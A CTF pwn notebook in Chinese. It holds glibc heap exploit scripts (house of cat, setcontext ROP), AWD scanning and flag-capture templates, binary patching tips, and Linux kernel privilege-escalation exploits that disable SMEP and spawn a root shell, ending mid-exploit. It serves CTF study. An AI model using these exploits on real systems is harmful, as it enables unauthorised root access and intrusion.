orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x1b00)+p64(pop_rdx)+p64(0x50)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)+"/flag".ljust(8,'\x00')

payload = p64(0) + p64(next_load) + p64(0) + p64(fake_heap_addr)
payload += p64(setcontext) + p64(ret) # rdx_addr/call rdx

payload += p64(flag_addr) # rsp
payload += orw # 0x78
payload = payload.ljust(0xc8,'\x00')
# payload += p64(bin_sh)# rsp
# payload += p64(0)
# payload += p64(system)
# payload += '\x00'*0x80

payload += p64(fake_heap_addr + 0x28 + 0x18) # rdx+0xa0
payload += p64(pop_rdi) # rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')# 2.36
payload += '\x10'
# payload = payload.ljust(0x31C - 0x10,'\x00')
# payload += '\x08'

edit(2,payload)
edit(1,'a'*0x500+p64(fake_heap_addr + 0x20))

sla(">",5)
ia()
```


```python
fake_heap_addr = heap_base + 0xbf0# rtl_global填的地址一般指向堆的head头
next_load = libc_base + xxx

payload  = p64(0) + p64(next_load)
payload += p64(0) + p64(fake_heap_addr)
payload += p64(libc_base+0x0000000000157c3a) + p64(ret)
# 0x0000000000157c3a : mov rdx, rbp ; mov rdi, r13 ; call qword ptr [rax + 0x20]
# payload += p64(bin_sh) + p64(ret)
# payload += p64(system) + p64(setcontext)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)

payload += p64(heap_base) + p64(ret)
payload += p64(pop_rsi) + p64(setcontext)
payload += p64(pop_rsi) + p64(0x10000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect) + p64(heap_base+0x001550)# shellcode_addr
payload += p64(0) + p64(0)

payload += p64(fake_heap_addr + 0x28 + 0x18)# 0xa0 rsp
payload += p64(pop_rdi)# 0xa8 rcx
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')
payload += '\x10'

edit(2,payload)
edit(1,'a'*0x420 + p64(fake_heap_addr + 0x20))# call setcontext 
# dbg('b _dl_call_fini\nc\n')

sla('>>','5')
sla('name:','e4l4')
```



### house of cat 

```c
__malloc_assert->__fxprintf->locked_vfxprintf->__vfprintf_interna->__vfprintf_internal
->_IO_wfile_seekoff->_IO_switch_to_wget_mode(_IO_WOVERFLOW)
```





````python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./house_of_cat")
elf = ELF("./house_of_cat")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def login():
    sa("mew mew mew~~~~~~",'LOGIN | r00t QWB QWXFadmin')

def game():
    sa("mew mew mew~~~~~~",'CAT | r00t QWB QWXF'+'\xff'+'$')

def add(idx,size,con='a'):
    game()
    sla("plz input your cat choice:",1)
    sla("plz input your cat idx:",idx)
    sla("plz input your cat size:",size)
    p.sendafter("plz input your content:",con)

def dele(idx):
    game()
    sla("plz input your cat choice:",2)
    sla("plz input your cat idx:",idx)

def show(idx):
    game()
    sla("plz input your cat choice:",3)
    sla("plz input your cat idx:",idx)

def edit(idx,con):
    game()
    sla("plz input your cat choice:",4)
    sla("plz input your cat idx:",idx)
    p.sendafter("plz input your content:",con)


login()
add(0,0x420)
add(1,0x418)
add(2,0x418)

dele(0)
add(3,0x430)
show(0)
libc_base = l64()-0x21A0D0
lg('libc_base')
main_arena = libc_base+0x21A0D0
p.recv(10)
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x290
lg('heap_base')
#---------------------------------------------------------
setcontext = libc_base + libc.sym['setcontext'] + 61 
# Close = libc_base + libc.sym['close']
# Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']
stderr = libc_base + libc.sym['stderr'] # *
IO_wfile_jumps = libc_base + 0x2160c0 # *
lg('IO_wfile_jumps')
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x0000000000090529 
pop_rax = libc_base + 0x0000000000045eb0
syscall = libc_base + 0x0000000000091396
ret= libc_base + 0x0000000000029cd6


orw_addr = heap_base+0x17b0
fake_io_addr = heap_base+0xae0  # 伪造的fake_IO结构体的地址
flag = fake_io_addr+0x160

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(setcontext) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) # _mode = 1
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x10)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

fake_IO_FILE =  fake_IO_FILE.ljust(0x150,'\x00')
fake_IO_FILE += p64(orw_addr)+p64(ret)# fake_io_addr+0xb0+0xa0/0xa8
fake_IO_FILE += '/flag'.ljust(0x10, '\x00')

dele(2)# 因为题目只能edit 0x30/所以要重新申请
add(5,0x418,fake_IO_FILE[0x10:])

dele(2)
edit(0,p64(main_arena)*2+p64(0)+p64(stderr-0x20))
add(4,0x450)
#----------------------------------------------
# orw =  p64(pop_rdi)+p64(0)+p64(Close)# 限制了read的fd为0
# orw += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
orw += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_io_addr+0x200)+p64(pop_rdx_rbx)+p64(0x30)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)
add(6,0x450,orw)

# Largebinattack改topchunk位为小值
add(7,0x440)
add(8,0x430)
add(9,0x430)
dele(7)
add(10,0x450)
dele(9)
edit(7,p64(libc_base+0x21a0e0)*2+p64(0)+p64(heap_base+0x2d30+3-0x20))
game()
sla("plz input your cat choice:",1)
sla("plz input your cat idx:",15)
sla("plz input your cat size:",0x468)# Largebinattack 和 __malloc_assert

p.interactive()
````


## Fuzz with CTF🏃

w: 清空后覆写，没有先创建
a: 追加，没有先创建
r: 不清空覆写，没有会报错
所有后边多一个+，都是同时读写

```python
def fuzz():
    f=open('./log.txt','w')
    for i in range(0x1000):
        if(i%10==0):
            a = randint(0,8)
            b = randint(0,8)
            add(a,b,str(i))
            data0=r.recvuntil('Choice Table')
            if 'two many' in data0:
                break
            f.write(' add({},{},str({}))\n'.format(a,b,i))
        elif(i%2==0):
            a = randint(0,8)
            b = randint(0,8)
            delet(a,b)
            data0=r.recvline()
            if 'not exists' in data0:
                continue
            f.write(' delet({},{})\n'.format(a,b))
        else:
            continue
            a = randint(0,8)
            b = randint(0,8)
            c = randint(0,8)
            d = randint(0,8)
            query(a,b,c,d)
            data0=r.recvuntil('Choice Table')
            if 'totally 0 elements' in data0:
                continue
            elif '\x55' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
            elif '\x56' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
    f.close()
```


```python
def fuzz():
    f=open('log.txt','w')
    for i in range(0,0x1000):
        if i % 10 == 0:
           idx=randint(0,0x10)
           add(idx,0x20)
           f.write('add({},0x20)'.format(idx)+'\n')
        elif i % 2 == 0 :
           idx=randint(0,0x10)
           delet(idx)
           f.write('delt({})'.format(idx)+'\n')
        elif i % 3 == 0 :
           idx=randint(0,0x10)
           show(idx)
           r.recvuntil('>>: ')
           check_char=r.recv(1)
           if check_char == '\x55' or check_char == '\x56':
              f.write('show({})'.format(idx)+'\n')
              break            
    f.close()
```


## musl

```bash
sudo cp ./libc.so /lib/ld-musl-x86_64.so.1
```



## AWD&AWDP

扫存活

```shell
nmap -sn 192.168.3.1/24
nmap -sT --min-rate 10000 -p- 192.168.3.122
```

tcpdump抓取流量包

```shell
tcpdump -i lo host 192.168.1.123 and port 9999 -w /tmp/xxx.pcap
```

然后wireshark分析，选择包->原始数据

```python
payload = '''
'''
payload = payload.split("\n")
print(payload)
for x in payload:
	p.send(unhex(x))
```

### 审查点

scanf+堆 == 堆溢出

UAF，程序只置空了指针而没有置空 size，或者相反

### patch

改eh_frame：

在.eh_frame添加函数功能

选中目标段，全部nop，edit->function->create function

替换掉原始指令



增加eh_frame段执行权限，修改开头eh_frame的pht，Flags字段

![image-20231017194109359](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231017194109359.png)

UAF   

**1.nop free_plt**

2.uaf_patch

在eh_frame段写这些内容，原free函数jump过来即可

```
call    _free
mov     qword ptr [202050h], 0
jmp     loc_C0A
```



循环while

只需要把变量变为常量0/1



printf()格式化字符串

修改寄存器赋值，不改动printf以及eh_frame
rdi<- %s
rsi <- 地址

加%s参数。在`.eh_frame`段中填入%s字符串，假设地址为0x400c01，将`mov edi, offset format`，修改为`mov edi offset 0x400c01, mov rsi offset format`。



数组越界

添加判断语句

比如，在eh_frame段写这些内容，jmp过来

```
.eh_frame:00000000004012C8 83 BD E8 FB FF FF 63          cmp     dword ptr [rbp-418h], 63h ; 'c'
.eh_frame:00000000004012CF 0F 87 25 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012CF
.eh_frame:00000000004012D5 83 BD EC FB FF FF 15          cmp     dword ptr [rbp-414h], 15h
.eh_frame:00000000004012DC 0F 87 18 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012DC
.eh_frame:00000000004012E2 48 8D 3D 2F FA FF FF          lea     rdi, aPleaseInputWas            ; "PLEASE INPUT wasd TO MOVE YOURSELF!"
.eh_frame:00000000004012E9 E9 0C F6 FF FF                jmp     loc_4008FA
```



如果本来有沙盒，prctl->nop，再进行加沙箱的操作



命令执行修复 破坏字符串，比如flag这样的字符串

update.sh

```shell
#!/bin/sh
# update.sh
cp pwn /home/ctf/pwn
cp libc.so.6 /lib/x86_64-linux-gnu/libc.so.6
cp ld-xx.so/lib64/ld-linux-x86-64.so.2
chmod 777 /home/ctf/pwn

tar -zcvf 1.tar.gz ./xxx ./update.sh
```



### 参考资料

https://ohmygodlin.github.io/ctf/awd/2020/11/20/AWD-pwn%E5%A4%87%E5%BF%98/



```
llvm混淆0x23aaa 0x28
```





### Fix-tips

- nop free/syscall（UserManager、tmpfs、pwn_vvvvmmmm）
- mmap 7 改为 3（oldvm、cgi）
- 缩小 size（SafeParse、mvvm）



### pwn_waf

```bash
mkdir /tmp/.waf         # 创建一个目录，注意要和编译时的配置文件一致。
chmod 777 /tmp/.waf     # 修改对应的权限
cp /tmp/hosts.txt /tmp/.waf/hosts.txt  # 将多目标防护的对象文件放到正确位置

cp /path/pwn /tmp/.waf       # 将要防护的pwn文件，复制到对应的目录
cp /tmp/catch /path/pwn      # 用catch 或者 i0gan 、 forward 替换原始的pwn文件
chmod 777 /path/pwn
chmod 777 /tmp/.waf/pwn
```

### sandbox

```bash
evilPatcher file [enter]
evilPatcher file /pach/sandboxfile
```

### 提交模板

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# context.log_level = "debug"
context.arch = "amd64"

context.terminal = ['tmux', 'splitw', '-h']

ip = server_ip = sys.argv[1].split(':')[0]
port = server_port = int(sys.argv[1].split(':')[1])

p = remote(ip, port)
# p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def cat_flag():
    flag_header = 'flag{'
    sleep(1)
    sl('cat flag')
    ru(flag_header)
    flag = flag_header + ru('}') + '}'
    write_to_flags(flag + '\n')
    write_to_logs('\nexploited: ' + server_ip.encode() + ':' + str(server_port).encode() + flag)
    exit(0)

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + '\n')
    fd.close()
    
ia()
cat_flag()
```



## Kernel

### 调试注意

```c
printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
```

调试内核模块bss段时，要注意实际地址跟IDA分析出来的地址不一样。

解打包cpio命令

```shell
# 快速打包测试EXP
ktest ./rootfs.cpio ./exp

# 解包
excpio ./rootfs.cpio

# 打包
cd rootfs
packcpio .
```

gdb调试
```shell
qemu -s

gdb
pwndbg> file ./vmlinux
pwndbg> target remote :1234
pwndbg> add-symbol-file ./xxx.ko 0xffffffffa0000000 程序基地址（lsmod）
# babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
pwndbg> b start_kernel
pwndbg> c
```

堆信息
```
gef➤  p &kmalloc_caches
$1 = (struct kmem_cache *(*)[14]) 0xffffffff81e21700 <kmalloc_caches>
gef➤  x/20gx 0xFFFFFFFF81E21700
<kmalloc_caches>:	0x0000000000000000	0xffff880002c01a00(0x60)
<kmalloc_caches+16>:	0xffff880002c01800(0xc0)	0xffff880002c01e00(0x8)
<kmalloc_caches+32>:	0xffff880002c01d00(0x10)	0xffff880002c01c00(0x20)
<kmalloc_caches+48>:	0xffff880002c01b00(0x40)	0xffff880002c01900(0x80)
<kmalloc_caches+64>:	0xffff880002c01700(0x100)	0xffff880002c01600(0x200)
<kmalloc_caches+80>:	0xffff880002c01500(0x400)	0xffff880002c01400(0x800)
<kmalloc_caches+96>:	0xffff880002c01300(0x1000)	0xffff880002c01200(0x2000)
0xffffffff81e21770 <kmem_cache>:	0xffff880002c01000	0x0000000000000004
0xffffffff81e21780 <sysctl_compact_memory>:	0x0000000000000000	0xffff8800026e6000
0xffffffff81e21790 <high_memory>:	0xffff880003fe0000	0x0000000000000000


gef➤  p (struct kmem_cache)*0xffff880002c01500

```

 找gadget

```shell
ROPgadget --binary ./vmlinux > ropgadget.txt
```

将bzImage转化成vmlinux

```shell
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux

$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=76517ec1ebecb36ffb324a8b5b0495c51625c53b, stripped
$ file bzImage 
bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (root@ubuntu) #3 SMP Thu Jun 3 01:01:56 PDT 2021, RO-rootFS, swap_dev 0x7, Normal VGA
```

slab_freelist_hardened确认
```shell
vmlinux-to-elf bzImage vmlinux.elf
在vmlinux.elf搜索kmalloc函数，看prefetcht0指令临近的前几条指令没有xor指令，没有则没有开启
```


### 内核堆管理

#### 节点 区 页的概念

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150511.png)

MC就是一个节点的边标志，对应了CPU组和一段内存，每个节点间独立工作
在这段内存上会进一步划分为不同的区如 ZONE_DMA、ZONE_NORMAL 等
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150642.png)
而每个区呢就像下图所示，每个区都有自己的伙伴系统
#### buddy system
伙伴块，大小相等，地址相邻，都空闲时会合并成更大块

其存在于 区 这一级别，管理区

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105113714.png)

按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为连续的空闲页面的大小，不过单位不是页面数，而是阶，即对于每个下标而言，其中所存储的页面大小为：2^order

分配：
请求内存向2的次方进行对齐，然后选择对应的free_area。取不到就从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中。
释放：
释放到对应的free_arena中，检查伙伴块状态如果也是free的，那就合并进入下一个order

#### slab allocator
三个版本
slab -> slob -> slub

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105115134.png)
kmem_cache 为一个全局的基本的 allocator 组件，用于分配Obj，每个 kmem_cache 代表一种特定大小和类型的内存缓存，用于管理特定类型的对象分配。
每个用于标记不同大小的kmem_cache存在于两个结构体kmalloc_cashes(通过CPU)和kmalloc_dma_caches(不通过CPU)中，这里主要看kmalloc_cashes


kmem_cache主要由2个大模块，kmem_cache_cpu和kmem_cache_node组成
kmem_cache_cpu(按核心)是一个 percpu 变量(每个核心上有一个)，Per-CPU 变量是一种特殊的数据结构，它为系统中的每个 CPU 核心提供了一个独立的变量副本，即针对于当前CPU核心
主要用以表示当前核心正在使用的 slub，当前 CPU 会优先从 kmem_cache_cpu 上取 object

kmem_cache_node(按节点)，每个 NUMA 节点都有一个对应的 kmem_cache_node 实例，分别管理各自节点的内存分配情况
其中主要有2个链表，分别是partial和full
partial：slub链表，slub 上存在着一定数量的空闲 object，但并非全部空闲。
full：slub链表，该 slub 上的所有 object 都被分配出去了。

分配
首先从 kmem_cache_cpu 上取对象，若有则直接返回。
若 kmem_cache_cpu 上的 slub 已经无空闲对象了，对应 slub 会被从 kmem_cache_cpu 上取下，并尝试从 partial 链表上取一个 slub 挂载到 kmem_cache_cpu 上，然后再取出空闲对象返回。
若 kmem_cache_node 的 partial 链表也空了，那就向 buddy system 请求分配新的内存页，划分为多个 object 之后再给到 kmem_cache_cpu，取空闲对象返回上层调用
(\*调用内存分配函数时提供的标志（如 GFP_KERNEL, GFP_ATOMIC 等）会决定从哪个buddy system里取内存页)
释放：
若被释放 object 属于 kmem_cache_cpu 的 slub，直接使用头插法插入当前 CPU slub 的 freelist。
若被释放 object 属于 kmem_cache_node 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist。
若被释放 object 为 full slub，则其会成为对应 slub 的 freelist 头节点，且该 slub 会被放置到 partial 链表。


### 结构体总结

https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D

| 结构体/能力 | 控制流劫持 | 泄露堆 | 泄露栈 | 泄露内核地址 | 结构体大小 |
| ---- | ---- | ---- | ---- | ---- | ---- |
| cred | x | √ | x | x | 0xa8 (kmalloc-192) |
| tty_struct | √ | √ | x | √ | 0x2e0 (kmalloc-1024) |
| seq_operations | √ | x | x | √ | 0x20 (kmalloc-32) |
| subprocess_info | √ | √ | x | √ | 0x60 (kmalloc-128) |
| pipe_buffer | √ | x | x | √ | 0x280 (kmalloc-1024) |
| shm_file_data | x | √ | x | √ | 0x20 (kmalloc-32) |
| msg_msg | x | √ | x | x | 0x31~0x1000 (>= kmalloc-64) |
| timerfd_ctx | x | √ | x | √ | 0xf0 (kmalloc-256) |
#### cred

#### tty_struct

#### seq_operations


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<errno.h>

int fd_stat;
__uint64_t temp_buf[4];
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b （ret）
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t fake_stack[20];
__uint64_t fake_stack_addr = &fake_stack;

size_t pkc_addr = 0xffffffff81070260;
size_t cc_addr = 0xffffffff8106fed0;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}



__uint64_t gadget1 = 0xffffffff815f5951;// add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret

int main(){
    save_status();
    printf("fake_stack_addr: 0x%llx\n",fake_stack_addr);

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);

    fd_stat = open("/proc/self/stat",0);
    write(fd2,&gadget1,8);

    fake_stack[0] = pop_rax_ret;
    fake_stack[1] = 0x6f0;
    fake_stack[2] = mov_cr4_rax_ret;
    fake_stack[3] = 0xffff;         // rbp, padding
    fake_stack[4] = get_root;
    fake_stack[5] = swapgs_ret;
    fake_stack[6] = iretq;
    fake_stack[7] = get_shell;
    fake_stack[8] = user_cs;
    fake_stack[9] = user_rflags;
    fake_stack[10] = user_sp;
    fake_stack[11] =  user_ss;

    __asm__(
    "mov r15, 0x15151515;"
    "mov r14, 0x14141414;"      // 4
    "mov r13, mov_rsp_rax_ret;"      // 3
    "mov r12, fake_stack_addr;"      // 2
    "mov r11, 0x11111111;"
    "mov r10, 0x10101010;"      // r10
    "mov rbp, 0xbbbbbbbb;"      // 5
    "mov rbx, pop_rax_ret;"      // 1
    "mov r9, 0x99999999;"       // r9
    "mov r8, 0x88888888;"       //r8
    "mov rcx, 0xcccccccc;"
    "xor rax, rax;"
    "mov rdx, 0x20;"
    "mov rsi, temp_buf;"
    "mov rdi, fd_stat;"
    "syscall"
    );
    close(fd_stat);
	close(fd2);
    return 0;
}
```

```c
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, 0x14141414;"      // 1
        "mov r13, 0x13131313;"      // 2
        "mov r12, 0x12121212;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, 0x10101010;"      // 7
        "mov rbp, 0xaaaaaaaa;"      // 4
        "mov rbx, 0xbbbbbbbb;"      // 5
        "mov r9, 0x99999999;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
```

#### subprocess_info


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp -lpthread
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


int race_flag = 0;
static int fd1 = 0;
static int fd2 = 0;
__uint64_t target_buf[2];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    //char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    //(*cc)((*pkc)(0));
    (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void race()
{
    target_buf[0] = xchg_esp_eax_ret;
    target_buf[1] = 0x11111111;
    __uint64_t fake_stack_addr = ((__uint64_t)xchg_esp_eax_ret & 0xffffffff);
    if(mmap((char*)(fake_stack_addr&(~0xfff)),0x2000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) == MAP_FAILED){
        perror("mmap failed.");
    }
    __uint64_t* fake_stack_ptr = (__uint64_t*)fake_stack_addr;
    int index = 0;
    fake_stack_ptr[index++] = pop_rax_ret;
    fake_stack_ptr[index++] = 0x6f0;
    fake_stack_ptr[index++] = mov_cr4_rax_ret;
    fake_stack_ptr[index++] = 0xffff; 
    fake_stack_ptr[index++] = get_root;
    fake_stack_ptr[index++] = swapgs_ret;
    fake_stack_ptr[index++] = iretq;
    fake_stack_ptr[index++] = get_shell;
    fake_stack_ptr[index++] = user_cs;
    fake_stack_ptr[index++] = user_rflags;
    fake_stack_ptr[index++] = user_sp;
    fake_stack_ptr[index++] = user_ss;

    while(1)
    {
        write(fd2,target_buf,0x60+0x50);
        if(race_flag)
        {
            printf("child: detect race happen\n");
            break;
        }
    }
}


int main(){
    save_status();

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);
    pthread_t th1;
    pthread_create(&th1,NULL,race,NULL);
    while(1){
        usleep(1);
        socket(22,AF_INET,0);                
        if(race_flag){
            printf("parent: detect race happen\n");
            break;
        }
    }
    close(fd2);

    return 0;
}
```



#### pipe_buffer


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp 
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


size_t fake_pipe_ops[5];
size_t fake_pipe_buffer[5];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t pop_rsp_ret = 0xffffffff81010fd7;     // pop rsp ; ret


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    // (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


int main(){
    save_status();
